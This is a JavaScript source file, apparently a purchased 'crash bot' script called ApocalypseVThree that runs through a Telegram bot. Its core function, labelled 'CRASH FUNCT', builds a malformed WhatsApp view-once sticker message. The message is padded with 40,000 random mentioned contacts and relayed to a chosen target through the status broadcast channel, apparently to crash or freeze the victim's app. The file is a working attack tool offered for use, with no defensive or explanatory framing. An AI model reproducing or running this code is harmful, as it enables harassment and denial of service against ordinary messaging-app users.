// ========================= [ CRASH FUNCT ] =========================
async function bulldozer(paw, target) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await paw.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

// --- Jalankan Bot ---
async function initializeBot() {
  console.log(chalk.bold.white(`\n
⣿⣿⣷⡁⢆⠈⠕⢕⢂⢕⢂⢕⢂⢔⢂⢕⢄⠂⣂⠂⠆⢂⢕⢂⢕⢂⢕⢂⢕⢂
⣿⣿⣿⡷⠊⡢⡹⣦⡑⢂⢕⢂⢕⢂⢕⢂⠕⠔⠌⠝⠛⠶⠶⢶⣦⣄⢂⢕⢂⢕
⣿⣿⠏⣠⣾⣦⡐⢌⢿⣷⣦⣅⡑⠕⠡⠐⢿⠿⣛⠟⠛⠛⠛⠛⠡⢷⡈⢂⢕⢂
⠟⣡⣾⣿⣿⣿⣿⣦⣑⠝⢿⣿⣿⣿⣿⣿⡵⢁⣤⣶⣶⣿⢿⢿⢿⡟⢻⣤⢑⢂
⣾⣿⣿⡿⢟⣛⣻⣿⣿⣿⣦⣬⣙⣻⣿⣿⣷⣿⣿⢟⢝⢕⢕⢕⢕⢽⣿⣿⣷⣔
⣿⣿⠵⠚⠉⢀⣀⣀⣈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣗⢕⢕⢕⢕⢕⢕⣽⣿⣿⣿⣿
⢷⣂⣠⣴⣾⡿⡿⡻⡻⣿⣿⣴⣿⣿⣿⣿⣿⣿⣷⣵⣵⣵⣷⣿⣿⣿⣿⣿⣿⡿
⢌⠻⣿⡿⡫⡪⡪⡪⡪⣺⣿⣿⣿⣿⣿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃
⠣⡁⠹⡪⡪⡪⡪⣪⣾⣿⣿⣿⣿⠋⠐⢉⢍⢄⢌⠻⣿⣿⣿⣿⣿⣿⣿⣿⠏⠈
⡣⡘⢄⠙⣾⣾⣾⣿⣿⣿⣿⣿⣿⡀⢐⢕⢕⢕⢕⢕⡘⣿⣿⣿⣿⣿⣿⠏⠠⠈
⠌⢊⢂⢣⠹⣿⣿⣿⣿⣿⣿⣿⣿⣧⢐⢕⢕⢕⢕⢕⢅⣿⣿⣿⣿⡿⢋⢜⠠⠈
⠄⠁⠕⢝⡢⠈⠻⣿⣿⣿⣿⣿⣿⣿⣷⣕⣑⣑⣑⣵⣿⣿⣿⡿⢋⢔⢕⣿⠠⠈
⠨⡂⡀⢑⢕⡅⠂⠄⠉⠛⠻⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢋⢔⢕⢕⣿⣿⠠⠈
⠄⠪⣂⠁⢕⠆⠄⠂⠄⠁⡀⠂⡀⠄⢈⠉⢍⢛⢛⢛⢋⢔⢕⢕⢕⣽⣿⣿⠠⠈
┏━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ ApocalypseVThree
┣━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ Created By AxpawXOne¡?
┃ THANKS FOR BUYYING MY SCRIPT
┗━━━━━━━━━━━━━━━━━━━━━━━━━━`));

  await initializeWhatsAppConnections(); // WA connect dulu
  await bot.launch(); // Baru Telegram bot jalan
  console.log("Telegram bot is running...");
}

initializeBot().catch(err => {
  console.error("Error during bot initialization:", err);
});

// Handle shutdown
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));